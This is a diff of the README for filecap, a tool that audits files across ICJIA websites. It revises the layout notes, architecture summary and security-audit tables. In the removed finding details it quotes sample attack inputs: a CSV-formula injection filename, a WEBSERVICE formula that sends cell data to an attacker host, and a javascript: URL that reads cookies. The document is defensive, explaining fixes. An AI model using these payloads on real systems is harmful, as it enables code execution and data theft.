@@ -31,33 +31,27 @@ The included `audit-remote.sh` script automates the entire workflow against any 
 
 As of 1.2.0, you can also publish the latest snapshot to a URL that your whole team can bookmark — one command bundles everything and deploys to Netlify. See [Publishing a fleet snapshot](#publishing-a-fleet-snapshot).
 
-### Current shape of the fleet rollup (v1.7.x)
+### Current shape of the fleet rollup
 
-The page reads like an infographic, not a spreadsheet. Five major areas, top to bottom:
+The deployed page reads like an infographic, not a spreadsheet. Five major areas, top to bottom:
 
-**1. Navbar.** ICJIA wordmark on the left; two filled-blue action buttons on the right — **`ICJIA Accessibility FAQs`** (links to [accessibility.icjia.app](https://accessibility.icjia.app)) and **`ICJIA PDF Audit Tool`** (links to [audit.icjia.app](https://audit.icjia.app)).
+**1. Navbar.** ICJIA wordmark on the left; two filled-blue action buttons on the right — `ICJIA Accessibility FAQs` ([accessibility.icjia.app](https://accessibility.icjia.app)) and `ICJIA PDF Audit Tool` ([audit.icjia.app](https://audit.icjia.app)).
 
-**2. Fleet hero.** Leads with the **audit count** (the actionable number — e.g. "4,871 files may need accessibility audit") in big amber type. A donut chart on the right shows the audit-share percentage with a plain-English caption like "About half may need audit."
+**2. Fleet hero.** Leads with the **audit count** in big amber type (e.g. "4,871 files may need accessibility audit") with a donut chart showing the audit-share percentage and a plain-English caption like "About half may need audit."
 
-**3. PII reassurance banner.** Sits directly above the site grid. Headline reads *"Zero Personally Identifying Information (PII) in this audit"* with side-by-side IN / NOT-IN lists. As of v1.7.32 the companion `audit-fleet.ndjson` no longer carries PDF/DOCX `author` or `lastModifiedBy` fields, so the banner's strongest claim is now strictly accurate.
+**3. PII reassurance banner.** *"Zero Personally Identifying Information (PII) in this audit"* with side-by-side IN / NOT-IN lists. The companion `audit-fleet.ndjson` carries no PDF/DOCX `author` or `lastModifiedBy` fields, so the claim is strictly accurate.
 
-**4. Site cards.** One per ICJIA site, alphabetised by title. Each card carries:
+**4. Site cards.** One per ICJIA site, alphabetised by title. Each card has a coloured "For bulk file access" chip that opens an instructions modal with a 3-step numbered workflow and a direct contact line to **`christopher.schweda@illinois.gov`**; big two-up tiles (total files / may need audit) with a CSS-only donut; a `Download spreadsheet` button with `Last audit: <date>` caption; and a `Technical details` disclosure (Website / IP / Hostname / Path / URL with copy-to-clipboard buttons). The whole card is one click target to the per-site detail page.
 
-- A coloured **"For bulk file access"** chip (cyan = Strapi, violet = GitHub, amber = bare server) that, as of v1.7.34, opens a full instructions modal on click — two plain-English paragraphs explaining where the files live, a 3-step numbered workflow, and a direct contact line to **`christopher.schweda@illinois.gov`** (sole access authorizer at ICJIA — fastest path to a credential).
-- Big two-up tiles (total files / may need audit) + CSS-only donut + plain-English bucket phrase.
-- A clickable **`Download spreadsheet`** button with a `Last audit: <date>` caption beneath it so staff can tell whether their downloaded CSV is current.
-- A **`Technical details`** disclosure that expands to a labeled mini-grid (Website / IP / Hostname / Path / URL) with copy-to-clipboard buttons on every row.
-- The **whole card is one click target** (links to the per-site detail page); the per-card buttons still work independently via a `pointer-events` cascade.
+**5. By-file-type drill-down.** Click "PDFs" → full detail page listing every PDF across the fleet plus a filtered CSV. Same for Word, Excel, PowerPoint, images, text, archives, web files, and other.
 
-**5. By-file-type drill-down.** Click "PDFs" and you land on a full detail page listing every PDF across the fleet plus a CSV download with just those rows. Same for Word, Excel, PowerPoint, images, text, archives, web files, and other.
+**Per-site detail pages** mirror the index hero, surface a `How to access this site's files` panel, and include a sticky bar at the top with Back / FAQ / PDF Audit Tool / Download-CSV / Last-audit-date chips.
 
-**Per-site detail pages** mirror the index hero, surface a `How to access this site's files` panel (with the same `christopher.schweda@illinois.gov` direct-contact line), include copy-to-clipboard buttons on every meta-grid row, and a sticky bar at the top with **Back / FAQ / PDF Audit Tool / Download-CSV / Last-audit-date** chips.
+**Language and staff workflow.** Manager-facing strings use *"may need"* rather than prescriptive *"needs"* — filecap describes what the data suggests, the audit team decides what to do. Every CSV the bundle emits carries two staff-fill columns: `Delete?` (empty default — staff writes any non-blank value to flag for removal) and free-text `Notes`. These are CSV-only and don't appear in the HTML view.
 
-**Language and staff workflow.** All manager-facing strings use *"may need"* rather than prescriptive *"needs"* — filecap describes what the data suggests, the audit team decides what to do. Every CSV the bundle emits (per-site, master, and by-file-type) carries two staff-fill columns added in v1.7.16: `Delete?` (empty default — staff writes `X`, `YES`, `Y`, anything non-blank to flag for removal) and free-text `Notes`. These are CSV-only and don't appear in the HTML view.
+**1.8.0 Referenced column** *(shipping in pre-releases now)*. A new `Referenced` column slots in after `Duplicate of` on every CSV and HTML view, listing the page URLs that link to each file. Managers use it as the inflection point for the delete-vs-keep decision: if a file has no known referrers, it's a deletion candidate; if it's linked from one or more live pages, every linking URL surfaces directly in the cell. See [Reference discovery (1.8.0)](#reference-discovery-180) below.
 
-**Coming-soon section** *(new in v1.7.30)*. A violet-accented section at the bottom of the index listing four in-development reference-discovery features (the **Referenced** + **Status** columns, cross-site detection, SPA-page rendering, and sitemap-validated reference URLs). Managers see the roadmap on the deployed bundle without needing to dig through the repo.
-
-See the [v1.7.x CHANGELOG entries](CHANGELOG.md) for the version-by-version breakdown.
+See the [CHANGELOG](CHANGELOG.md) for the version-by-version breakdown.
 
 → Skip to [Quick start for managers](#quick-start-for-managers) for handoff instructions.
 
@@ -75,21 +69,23 @@ Two distribution shapes: `filecap` CLI invoked directly via npx, plus standalone
 
 ESM-only. Node 20+ required. 30 test files; 434 tests via vitest. Source under `src/`; entrypoint `bin/filecap.js`. License: MIT.
 
-### v1.7.x architecture summary
+### Architecture summary
 
-**Index renderer.** `renderCard` and `generateIndexHtml` (exported from `src/web/index-page.js`) build the fleet index — alphabetically-sorted `<article class="site-card">` elements, each with the dp-hero pattern: nickname → big full name → two-up tiles → CSS-only conic-gradient donut → expanded tech-details with copy buttons → "Last audit: …" caption.
+**Pipeline (1.8.0).** `scan` (per server, NDJSON) → `references` (per site, CMS-aware URL extraction; new in 1.8.0) → `cross-references` (fleet-wide URL → referrers reverse index; new in 1.8.0) → `web-rollup` (bundles latest scan of every saved site into a static-site directory ready for Netlify).
 
-**Per-site detail pages.** `writeHtml` (in `src/report/html.js`) renders each one using the same `dp-hero` block. It accepts `accessKind` for the access-method panel and emits both the `<table class="row-marker-table">` legend and the file table with `table-layout: fixed` + `<colgroup>` + per-`<th>` resize handles.
+**Index renderer.** `renderCard` + `generateIndexHtml` (`src/web/index-page.js`) build the fleet index — alphabetically-sorted `<article class="site-card">` elements with the dp-hero pattern: nickname → full name → two-up tiles → CSS-only conic-gradient donut → expanded tech-details with copy buttons → `Last audit:` caption.
 
-**CSV / HTML column layout.** `CSV_COLUMNS` (in `src/report/csv.js`) is the single source of truth. Entries flagged `csvOnly: true` (the `deleteFlag` and `notes` rows) are filtered out of the HTML view via `CSV_COLUMNS.filter(c => !c.csvOnly)`, so the web table stays at 14 columns while CSVs ship at 16.
+**Per-site detail pages.** `writeHtml` (`src/report/html.js`) renders each page using the same `dp-hero` block; it accepts `accessKind` for the access-method panel and emits the `<table class="row-marker-table">` legend plus the file table with `table-layout: fixed` + `<colgroup>` + per-`<th>` resize handles.
 
-**Site classification.** `deriveAccessKind(site)` and `TYPE_BUCKETS` (both exported from `src/commands/web-rollup.js`) classify sites into `strapi` / `github` / `server` and into per-file-type buckets, respectively. The latter drives one CSV+HTML pair per non-empty bucket (`audit-pdfs.csv` + `audit-pdfs.html`, etc.) — each bucket page reuses `writeHtml` with a consolidated header so the file table reads "across the fleet, filtered to PDFs" out of the box.
+**CSV / HTML column layout.** `CSV_COLUMNS` (`src/report/csv.js`) is the single source of truth. Entries flagged `csvOnly: true` (the `deleteFlag` and `notes` columns) are filtered out of the HTML view, so the web table stays at 14 columns + 1 `Referenced` column (1.8.0) while CSVs ship at 16 + 1.
 
-**Click handling.** Index-card clicks use `pointer-events: none` on non-interactive descendants with `pointer-events: auto` re-enabled on the action buttons, tech-details summary, copy-to-clipboard buttons, and (as of v1.7.34) the access-method chip. Much cleaner than the v1.7.1 z-index attempt that only let clicks land on padding gaps.
+**Site classification.** `deriveAccessKind(site)` and `TYPE_BUCKETS` (`src/commands/web-rollup.js`) classify sites into `strapi` / `github` / `server` and into per-file-type buckets. The latter drives one CSV+HTML pair per non-empty bucket (`audit-pdfs.csv` + `audit-pdfs.html`, etc.) by reusing `writeHtml` with a consolidated header.
 
-**Modal infrastructure** *(new in v1.7.34)*. The "For bulk file access" chip on each card opens a native `<dialog>` rendered once at the page footer. `ACCESS_MODAL_COPY` (in `src/web/index-page.js`) is the source of truth for the per-type instructions; a single `<dialog>` per access type is targeted by chips via `data-access-modal` attr. `showModal()` handles focus trap + Escape close; click-outside-to-close is wired by a small event handler in the existing inline `<script>` block.
+**References module (1.8.0).** `src/references/` — `url-canonical.js` (host lowercasing + fragment stripping), `extract-urls.js` (PDF/DOCX/XLSX/PPTX/ZIP URL regex over markdown), `field-classifier.js` (GraphQL `__type` field bucketing: url-string / body-string / upload-file / upload-file-list / relation / other), `domain-filter.js` (ICJIA-fleet whitelist from sites.json), `strapi-v3.js` + `strapi-v4.js` (per-version adapters with shared interface), `cross-resolver.js` (alias-aware reverse-index resolver). The orchestrators live in `src/commands/references.js` and `src/commands/cross-references.js`.
 
-**Tech stack.** Pure CSS / vanilla JS throughout — no chart library, no preprocessor. The only inline JS is the column-resize, table-pan, clipboard-copy, duplicate-filter, and access-modal handlers embedded in the report HTML.
+**Click handling.** Index-card clicks use `pointer-events: none` on non-interactive descendants with `pointer-events: auto` re-enabled on action buttons, tech-details summary, copy-to-clipboard buttons, and the access-method chip.
+
+**Tech stack.** Pure CSS / vanilla JS throughout — no chart library, no preprocessor. The only inline JS is column-resize, table-pan, clipboard-copy, duplicate-filter, and access-modal handlers embedded in the report HTML.
 
 → Skip to [Quick start](#quick-start) for installation and basic usage.
 
@@ -187,125 +183,31 @@ inline-JS additions). The summary below is for managers and auditors.
 - **The Netlify bundle URL** is not secret. `robots.txt` blocks search-engine indexing, but the URL could leak via browser history or link sharing. Netlify Site Password provides the recommended protection.
 - **Initial `curl audit-remote.sh` download.** The self-version-check detects post-download tampering, but not initial-fetch tampering. For maximum verifiability, download from a specific commit SHA URL rather than `main`.
 
-### Live deployment posture (1.5.6)
+### Live deployment posture
 
-The ICJIA fleet snapshot at https://icjia-fleet-audit.netlify.app was reviewed for deployment-specific risks after the initial deploy:
-
-| Check | Status |
-|---|---|
-| **TLS** | ✓ HTTP/2 over TLS 1.3 (Netlify managed certificate, auto-renewed) |
-| **HSTS** | ✓ `strict-transport-security` set by Netlify edge |
-| **`robots.txt`** | ✓ `User-agent: *` + `Disallow: /` — blocks every path for every compliant crawler |
-| **`X-Robots-Tag`** | ✓ `noindex, nofollow` on all HTML pages |
-| **CSV serving** | ✓ `Content-Disposition: attachment` + `Cache-Control: max-age=3600`; Netlify Site Password gates these too (returns 401 to unauthenticated requests) |
-| **Site Password gate** | ✓ Netlify Pro Site Password set via dashboard — server-side enforcement covers every file (verified HTTP 401 on `/`, `/audit-file-list-master.csv`, and a per-site report) |
-| **Security headers (all paths)** | ✓ `X-Frame-Options: DENY`, `X-Content-Type-Options: nosniff`, `Referrer-Policy: no-referrer` |
-| **Deploy previews** | Netlify deploy preview URLs inherit the site password setting by default; no separate exposure |
-| **Search engine indexing** | Belt-and-suspenders: robots.txt blocks crawlers; `X-Robots-Tag` blocks indexing of any page that gets crawled anyway; the URL pattern is non-discoverable (no inbound links from public sites); password gate blocks content delivery regardless |
-| **Bundle URL secrecy** | URL is not secret; could leak via browser history or link sharing. Site Password is the real protection. |
-
-The deployment review did **not** find new findings beyond the 1.3.0 audit's residual-risk list. The Netlify Pro Site Password upgrade (compared to the 1.3.0 client-side gate) closes FC-2026-005 (unsalted-SHA-256 cracking risk) and FC-2026-014 (publicly-guessable bundle URL) — both were "documented" findings now mitigated by the server-side gate.
+The ICJIA fleet snapshot at https://icjia-fleet-audit.netlify.app is deployed behind Netlify Pro Site Password (server-side enforcement, every file gated including the master CSV — verified HTTP 401 on `/`, the master CSV, and per-site reports). TLS 1.3 + HSTS, `robots.txt: Disallow: /`, `X-Robots-Tag: noindex,nofollow` on all HTML, `X-Frame-Options: DENY` + `X-Content-Type-Options: nosniff` + `Referrer-Policy: no-referrer`. The Pro password gate closes findings FC-2026-005 (unsalted-SHA-256 cracking risk) and FC-2026-014 (publicly-guessable bundle URL) from the 1.3.0 baseline.
 
 ### 2026-05-13 red/blue team re-audit (v1.7.35 → fixed in v1.7.36)
 
-A fresh adversarial pass against `@icjia/filecap@1.7.35`. **Zero Critical findings.** Seven findings total: three Moderate, three Low, one Informational. Five were fixed in v1.7.36 (CHANGELOG covers the per-finding code change). Two are deferred — one mitigated by the Netlify Pro Site Password gate, one a future signing decision.
+A fresh adversarial pass against `@icjia/filecap@1.7.35`. **Zero Critical findings.** Seven findings total: three Moderate, three Low, one Informational. Five were fixed in v1.7.36; two are mitigated by the Netlify Pro Site Password gate or deferred. Per-finding detail in [`docs/security/audit-2026-05-13.md`](docs/security/audit-2026-05-13.md).
 
 | # | Severity | Finding | Status |
 |---|---|---|---|
-| FC-2026-023 | Moderate | CSV-formula injection through filenames | **Fixed in 1.7.36** |
-| FC-2026-024 | Moderate | `<a href>` emitted without URL-scheme validation | **Fixed in 1.7.36** |
-| FC-2026-025 | Moderate | `sites.json` `name` field lacks slug-shape validation → path traversal | **Fixed in 1.7.36** |
-| FC-2026-026 | Low | `secrets.json` file-mode is not enforced | **Fixed in 1.7.36** (warn on load) |
-| FC-2026-027 | Low | Deploy bundle exposes internal server filesystem paths | Mitigated by Netlify Pro Site Password |
-| FC-2026-028 | Low | `webRollup.autoDeploy` silently pushes to production | **Fixed in 1.7.36** (banner + `FILECAP_NO_DEPLOY` opt-out) |
-| FC-2026-029 | Info | Bundle artefact integrity not signed or checksummed | Deferred (TLS covers transit-layer threat) |
-
-**Per-finding detail:**
-
-#### FC-2026-023 — CSV-formula injection through filenames (Moderate → Fixed)
-
-*Threat.* A filename like `=cmd|'/c calc'!A1.pdf`, `+SUM(1+1).pdf`, `@DDE(...)`, or a tab/CR-prefixed variant uploaded to a Strapi `/uploads/` directory flows into `audit-file-list-master.csv` via `csvCell`. A manager opens the CSV in Excel and the cell evaluates as a formula — RCE on the spreadsheet-opener's workstation in the worst case; data exfiltration via `=WEBSERVICE("attacker.com?"&A1)` in milder ones. CSVs are shared with external remediation vendors, so the attack reaches off-network targets too.
-
-*Fix in 1.7.36.* `csvCell` in `src/report/format.js` now prefixes cells whose first character is in `{= + - @ \t \r}` with a single quote (`'`). Excel / Sheets / Numbers strip the apostrophe on display, so the cell shows the filename unchanged but does not evaluate. The deliberate `="<sha256-hash>"` cell is allow-listed via a whole-cell pattern match (`/^="[^"\n]*"$/`) so the hash column still renders correctly. Five new tests cover the attack payloads.
-
-#### FC-2026-024 — `<a href>` emitted without URL-scheme validation (Moderate → Fixed)
-
-*Threat.* `htmlEscape` escapes `&<>"'` but does not validate the URL scheme. A malicious value in `sites.json` (`publicUrlBase`, `siteUrl`) or in scanned `entry.absolutePath` like `javascript:alert(document.cookie)` produces a clickable XSS-vector anchor in the bundle. Even though the bundle is password-gated, a click leaks the session cookie.
-
-*Fix in 1.7.36.* New `safeUrl(url)` helper in `src/report/html.js` returns the URL only when its parsed scheme is `http:` or `https:`. Both `<a href>` emit sites (publicUrl table cell + meta-grid Public URL row) now gate emission through `safeUrl()`. Values with bad schemes render as plain text (visible, not clickable).
-
-#### FC-2026-025 — `sites.json` `name` lacks slug-shape validation (Moderate → Fixed)
-
-*Threat.* `siteEntrySchema.name` was `z.string().min(1)` — any non-empty string passed. The value is interpolated into `path.join(auditsBase, siteKey, "latest", "inventory.ndjson")` and into the generated `_redirects` rules. A `name: "../../etc"` value caused traversal outside `~/filecap-audits/`. Insider / poisoned-shared-sites.json threat.
-
-*Fix in 1.7.36.* Schema tightened to `z.string().regex(/^[a-z0-9](?:[a-z0-9-]*[a-z0-9])?$/i)`. A `name: "../foo"` value now fails zod validation at load time, blocking the path-traversal vector at the schema layer.
-
-#### FC-2026-026 — `secrets.json` file-mode is not enforced (Low → Fixed via warn)
-
-*Threat.* `~/.filecap/secrets.json` carries bearer-token JWTs. Documented expected mode is `0600` but `loadSecrets()` did not check. A misconfigured file at `0644` (group/world readable) would load silently — on shared hosts, other users could read the tokens.
-
-*Fix in 1.7.36.* `loadSecrets()` stats the file on load; if `(mode & 0o077) !== 0` it emits a stderr warning naming the actual mode and a `chmod 600 …` remediation command. Doesn't refuse to load (single-user workstations are common); the warning is enough.
-
-#### FC-2026-027 — Deploy bundle exposes internal server filesystem paths (Low → Mitigated, no code fix)
-
-*Threat.* Per-site cards and detail pages show scanned-path values like `/home/forge/r3.icjia-api.cloud/strapi_v4/public/uploads`. Useful reconnaissance for an attacker who's gotten past the Netlify password gate (forwarded-link incident, share-with-vendor mishap).
-
-*Status.* Already mitigated by Netlify Pro Site Password (server-side gate, not the v1.5.6-era client-side hash). Redaction would be defense-in-depth only; the threat model already covers this. Deferred unless the gate is removed.
-
-#### FC-2026-028 — `webRollup.autoDeploy` silently pushes to production (Low → Fixed)
-
-*Threat.* With `webRollup.autoDeploy: true` in `~/.filecap/config.json`, every local `filecap web-rollup` invocation pushes to production Netlify. Developers running web-rollup as part of testing or local debugging silently published in-progress work twice during the 2026-05-13 development session.
-
-*Fix in 1.7.36.* `runNetlifyDeploy()` now prints a loud banner before invoking `netlify deploy --prod` so operators see the production push and can Ctrl-C if it wasn't intended. New `FILECAP_NO_DEPLOY=1` env var skips the deploy entirely — useful for tests, local regeneration, or any case where the user wants `web-rollup` to produce a bundle without pushing.
-
-#### FC-2026-029 — Bundle artefact integrity not signed or checksummed (Informational → Deferred)
-
-*Threat.* No `bundle.sig`. A downloader has no out-of-band way to verify the bytes weren't substituted by a man-in-the-middle.
-
-*Status.* Defer. TLS to Netlify covers the transit-layer threat; signing adds operational cost (key management, key rotation, vendor education) that isn't justified for the current "vendors fetch from a known TLS+password-gated URL" distribution model. Re-evaluate if distribution shifts to "vendors download from email or arbitrary mirrors."
+| FC-2026-023 | Moderate | CSV-formula injection through filenames | Fixed in 1.7.36 (cell-prefix `'` for `= + - @ \t \r` starts) |
+| FC-2026-024 | Moderate | `<a href>` without URL-scheme validation | Fixed in 1.7.36 (`safeUrl()` gates http/https) |
+| FC-2026-025 | Moderate | `sites.json` `name` lacks slug shape → path traversal | Fixed in 1.7.36 (`z.string().regex(/^[a-z0-9-]+$/i)`) |
+| FC-2026-026 | Low | `secrets.json` file-mode not enforced | Fixed in 1.7.36 (warn on load) |
+| FC-2026-027 | Low | Deploy bundle exposes server filesystem paths | Mitigated by Netlify Pro Site Password |
+| FC-2026-028 | Low | `webRollup.autoDeploy` silently pushes to prod | Fixed in 1.7.36 (loud banner + `FILECAP_NO_DEPLOY=1`) |
+| FC-2026-029 | Info | Bundle artefacts not signed | Deferred (TLS covers transit-layer threat) |
 
 
 
-### Audit findings summary (1.3.0 baseline)
+### Audit history (1.3.0 baseline)
 
-Findings below come from the 1.3.0 red/blue team audit. Versions 1.3.1 through 1.5.6 added features (bearer-token storage, master CSV, duplicates section, infographic hero, etc.) but did not change the core security posture of the original components. See the 2026-05-13 re-audit (link above) for the current state and the "Changes since 1.3.0" subsection below for what's new and how each was reviewed.
+The 1.3.0 red/blue team audit produced 17 findings, all Critical and Moderate fixed in that release: shell-injection in SSH commands (FC-2026-001/002), rsync symlink escape (FC-2026-003), MCP scan-path allowlist (FC-2026-004), unsalted-SHA-256 password-gate documentation (FC-2026-005), `sites.json` schema validation (FC-2026-007), HTML XSS coverage (FC-2026-008), audit output directory permissions (FC-2026-011). The full audit baseline lives in [`docs/security/audit-2026-05-10.md`](docs/security/audit-2026-05-10.md); the 1.3.x → 1.6.5 re-audit lives in [`docs/security/audit-2026-05-11.md`](docs/security/audit-2026-05-11.md).
 
-| ID | Severity | Finding | Status |
-|---|---|---|---|
-| FC-2026-001 | Critical | Shell injection via REMOTE_PATH in SSH scan commands | Fixed in 1.3.0 |
-| FC-2026-002 | Critical | Shell injection via path in SSH test/find/du commands | Fixed in 1.3.0 |
-| FC-2026-003 | Moderate | rsync follows remote symlinks (symlink escape) | Fixed in 1.3.0 |
-| FC-2026-004 | Moderate | MCP server has no scan-path allowlist | Fixed in 1.3.0 |
-| FC-2026-005 | Moderate | Unsalted SHA-256 password gate (cracking risk underdocumented) | Fixed in 1.3.0 (docs) |
-| FC-2026-006 | Moderate | sitesFile path not validated (info leakage via error messages) | Fixed in 1.3.0 |
-| FC-2026-007 | Moderate | sites.json not schema-validated on load | Fixed in 1.3.0 |
-| FC-2026-008 | Moderate | HTML XSS coverage verification and regression tests | Fixed in 1.3.0 |
-| FC-2026-009 | Low | Initial curl download not verifiable at fetch time | Documented |
-| FC-2026-010 | Low | npx --yes accepts any latest version (supply-chain) | Documented |
-| FC-2026-011 | Low | Audit output directory permissions not enforced | Fixed in 1.3.0 |
-| FC-2026-012 | Low | pdfjs-dist parsing-attack surface | Accepted (mitigated by isEvalSupported:false) |
-| FC-2026-013 | Low | jszip/exceljs zip-slip surface | Verified safe (in-memory only); documented |
-| FC-2026-014 | Low | Netlify bundle URL publicly guessable | Documented |
-| FC-2026-015 | Low | CSP header missing from netlify.toml | Deferred (inline scripts require unsafe-inline) |
-| FC-2026-016 | Note | Client-side gate is not real security (by design) | Documented |
-| FC-2026-017 | Note | Inventory NDJSON contains server metadata | Accepted (required for vendor work-order) |
-| FC-2026-018 | Moderate | `audit-static.sh` exposed `FILECAP_GITHUB_TOKEN` via argv to `git clone` / `git remote set-url` | Fixed in 1.6.6 (token now passed via GIT_CONFIG_* env vars, not URL) |
-| FC-2026-019 | Note | Master CSV + duplicates CSV in bundle increase data-exposure surface | Accepted (mitigated by Netlify Pro Site Password) |
-| FC-2026-020 | Note | `~/.filecap/secrets.json` readable by same-UID processes | Accepted (standard user-account trust model; env-var override available for 1Password CLI users) |
-| FC-2026-021 | Note | `audit-static.sh` clone dir trusts repo contents | Accepted (same as Strapi mirror; auditor only clones repos they trust) |
-| FC-2026-022 | Note | New inline JS in HTML reports (1.4.0+) reviewed for XSS | No new findings — all handlers use class-list / dataset reads, no innerHTML/eval |
-
-### Changes since 1.3.0 (security-relevant)
-
-| Version | Change | Security implication | Mitigation |
-|---|---|---|---|
-| 1.3.1 | `audit-fleet.sh` auto-reads `~/.filecap/sites.json` | No new surface — same data the saved-sites menu already exposed | sites.json mode-0600, schema-validated; bundle workflow safe for sharing |
-| 1.3.2 | `~/.filecap/config.json` for `webRollup.autoDeploy` | New file at `~/.filecap/` | Schema-validated, mode-0600; contains a Netlify site name (not a secret) |
-| 1.3.3 | Bearer-token support via `~/.filecap/secrets.json` | New credential at rest | Mode-0600, never bundled/exported; env-var override for users who prefer 1Password CLI / direnv; token fed to curl via stdin (`--header @-`), never argv |
-| 1.4.0 / 1.4.1 | Trimmed CSV/HTML to 14 columns; click-and-drag pan JS | No new surface — drag-pan is pointer-events only, no remote requests | XSS test suite (FC-2026-008) regression-covers the new render path |
-| 1.5.0 | Cross-server duplicates section; `audit-file-list-master.csv` in bundle | Adds data-exposure surface (master CSV is a single ~7 MB file with every path on every server) | Mitigated by Netlify Site Password gate at deployment time (verified HTTP 401 on the master CSV) |
-| 1.5.1 | `audit-file-duplicates.csv` (per-occurrence) in bundle | Same data-exposure surface, smaller file | Same mitigation |
-| 1.5.2–1.5.6 | Visual / UX changes (table styling, infographic hero, total in heading) | No new security surface | n/a |
+Subsequent releases added features (bearer-token storage in 1.3.3, master CSV + duplicates section in 1.5.x, `type:"git"` static-site repos in 1.6.0, manager-friendly visual redesign in 1.7.x, references pipeline in 1.8.0) — each reviewed for new surface and documented in the relevant audit file. The Netlify Pro Site Password gate (post-1.5.6) covers the data-exposure expansion from the master CSV.
 
 ### How to report a security issue
 
@@ -357,68 +259,39 @@ npx vitest run test/web-rollup.test.js
 
 ## Status
 
-**v1.7.x shipped.** The full inventory pipeline `scan → rollup → report → web-rollup → deploy` is end-to-end functional. What's live in the v1.7.x manager-friendly visual redesign:
+**v1.8.0 in pre-release.** Reference-discovery pipeline (`scan → references → cross-references → web-rollup`) shipping in v1.8.0-alpha / beta tags. The Referenced column on every CSV and HTML view, plus a fleet-wide URL → referrers reverse index, is the headline change. See [Reference discovery (1.8.0)](#reference-discovery-180) for the manager-facing overview.
 
-- **Fleet index** — infographic-style site cards alphabetised by title, big amber audit-count hero with a CSS-only donut chart and plain-English captions ("Two-thirds may need audit"), whole-card click → detail page, two-axis touch-friendly table scrolling, click-and-drag resizable detail-page columns.
-- **Copy-to-clipboard buttons** throughout (per-card tech-details mini-grid + per-site meta-grid).
-- **Per-file-type drill-down** — detail pages and CSV downloads for every non-empty bucket (`audit-pdfs.html`/`audit-pdfs.csv`, `audit-docx.*`, etc.).
-- **Staff-fill columns** on every CSV (v1.7.16): `Delete?` and `Notes`, CSV-only so the HTML view stays at 14 columns.
-- **Navbar buttons** on every page: `ICJIA Accessibility FAQs` + `ICJIA PDF Audit Tool` (links to accessibility.icjia.app and audit.icjia.app respectively). ICJIA wordmark on the index navbar. `Last audit: …` caption under every CSV download.
-- **Cross-server duplicates section** redesigned to explain in plain English that duplicates are normal — not a webmaster error.
-- **"For bulk file access" modal** (v1.7.34) — clickable chip on each site card opens a native `<dialog>` with full per-type instructions and a direct contact line to `christopher.schweda@illinois.gov`.
-- **"Coming soon" section** at the bottom of the fleet index (v1.7.30) listing four in-development reference-discovery features.
+**v1.7.x shipped.** Manager-friendly visual redesign, complete pipeline `scan → rollup → report → web-rollup → deploy`:
+
+- **Fleet index** — infographic site cards alphabetised by title, big amber audit-count hero with CSS-only donut + plain-English captions ("Two-thirds may need audit"), whole-card click → detail page, two-axis touch-friendly tables, click-and-drag resizable detail-page columns.
+- **Per-file-type drill-down** — detail page + filtered CSV download for every non-empty bucket (`audit-pdfs.html`/`.csv`, `audit-docx.*`, etc.).
+- **Staff-fill columns** on every CSV: `Delete?` and `Notes`, CSV-only so the HTML view stays at 14 columns.
+- **"For bulk file access" modal** — clickable chip on each site card opens a `<dialog>` with per-access-type instructions + direct contact `christopher.schweda@illinois.gov`.
+- **Cross-server duplicates section** with a plain-English explainer that duplicates are normal — not a webmaster error.
+- **"Zero PII" reassurance banner** above the site grid with side-by-side IN / NOT-IN lists.
+- **Navbar buttons** on every page: `ICJIA Accessibility FAQs` + `ICJIA PDF Audit Tool`. `Last audit:` caption under every CSV download.
+- **Copy-to-clipboard buttons** throughout (per-card tech-details + per-site meta-grid).
 
 **Inherited from earlier releases:**
 
-- Cross-server duplicates detection + per-occurrence duplicates CSV for pivot work (1.5.0, 1.5.1).
+- Cross-server duplicates detection + per-occurrence duplicates CSV (1.5.x).
 - Master CSV combining every file from every server (1.5.0).
-- One-command deploy to Netlify via the `webRollup.autoDeploy` config flag (1.3.2).
-- Bearer-token support for sites whose public URL requires JWT auth (1.3.3, mode-0600 `~/.filecap/secrets.json`).
+- One-command Netlify deploy via `webRollup.autoDeploy` (1.3.2).
+- Bearer-token support for sites requiring JWT auth (1.3.3, mode-0600 `~/.filecap/secrets.json`).
+- Git-type sites — audit self-contained static-site (Nuxt) repos by shallow-clone + scan of `/public/` (1.6.0).
 
-| Phase | Version | Status | Deliverable |
-|---|---|---|---|
-| 1 | v0.1.0 | shipped | Core scan — recursive walk, hashing, NDJSON output |
-| 2 | v0.2.0 | shipped | PDF introspection (image-only, tags, signatures, language) |
-| 3 | v0.3.0 | shipped | Office introspection (DOCX, XLSX, legacy flag) |
-| 4 | v0.4.0 | shipped | Filename flagging |
-| 5 | v0.5.0 | shipped | Multi-server rollup |
-| 6 | v0.6.0 | shipped | CSV reporter and summary artifacts |
-| 7 | v1.0.0 | shipped | MCP server entry point |
-| 8 | v1.0.1 | shipped | MCP client docs (Claude Desktop, Claude Code, Cursor, Windsurf, Continue) |
-| 9 | v1.0.2 | shipped | Audit automation scripts, HTML report, enhanced metadata, auditor-readable output |
-| 10 | v1.0.3 | shipped | Self-version-check, timestamped runs, `--site-name` flag, README overhaul |
-| 11 | v1.1.0 | shipped | Column-set slim, audit.icjia.app integration removed |
-| 12 | v1.2.0 | shipped | `filecap web-rollup` — static-site bundle with Netlify amenities; `filecap_web_rollup` MCP tool |
-| 13 | v1.3.0 | shipped | Red/blue team security audit (17 findings, all Critical and Moderate fixed) |
-| 14 | v1.3.x | shipped | Auto-detected `sites.json` for fleet script; opt-in `~/.filecap/config.json` `webRollup.autoDeploy`; bearer-token support (`~/.filecap/secrets.json`) |
-| 15 | v1.4.x | shipped | CSV/HTML deliverable trimmed to 14 columns; click-and-drag horizontal pan on every table |
-| 16 | v1.5.x | shipped | Cross-server duplicates with action explainer; master CSV + duplicates CSV in bundle; infographic hero; table-styling consistency; "Back to fleet index" navigation on per-site detail pages; footer links to GitHub + CHANGELOG |
-| 17 | v1.6.0 | shipped | `type: "git"` site mode — audit self-contained static-site (Nuxt) repos by shallow-cloning + scanning the repo's `/public/` folder. Mixed strapi + git fleets in one bundle. |
-| 18 | v1.7.x | shipped | Manager-friendly visual redesign: optional `siteFullName` field in `sites.json` plumbed end-to-end; 2-col infographic card grid with big two-up tiles, CSS-only donut, plain-English captions, file-type chips, clickable cards with hover elevation; matching `dp-hero` pattern on per-site detail pages; "Public URL" promoted to column 4; two-axis touch-pannable tables; resizable detail-page columns (drag right edge of any `<th>`); big visual duplicates section with always-visible plain-English explainer |
